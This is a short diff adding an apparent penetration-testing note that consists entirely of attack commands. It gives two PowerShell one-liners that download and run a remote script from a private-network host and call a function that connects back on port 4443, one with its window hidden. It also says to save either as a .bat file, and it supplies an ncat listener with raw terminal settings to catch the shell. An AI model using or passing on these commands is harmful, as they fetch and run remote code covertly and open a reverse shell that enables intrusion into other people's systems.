@@ -1,0 +1,11 @@
+powershell iex (iwr http://10.10.0.100:8000/update1.ps1 -UseBasicParsing);Grumpy 10.10.0.100 4443
+
+or
+
+powershell -windowstyle hidden iex (iwr http://10.10.0.100:8000/update1.ps1 -UseBasicParsing);Grumpy 10.10.0.100 4443
+
+
+save either as a .bat and execute
+
+listen with
+ stty raw -echo; (stty size; cat) | ncat -nvlp 4443
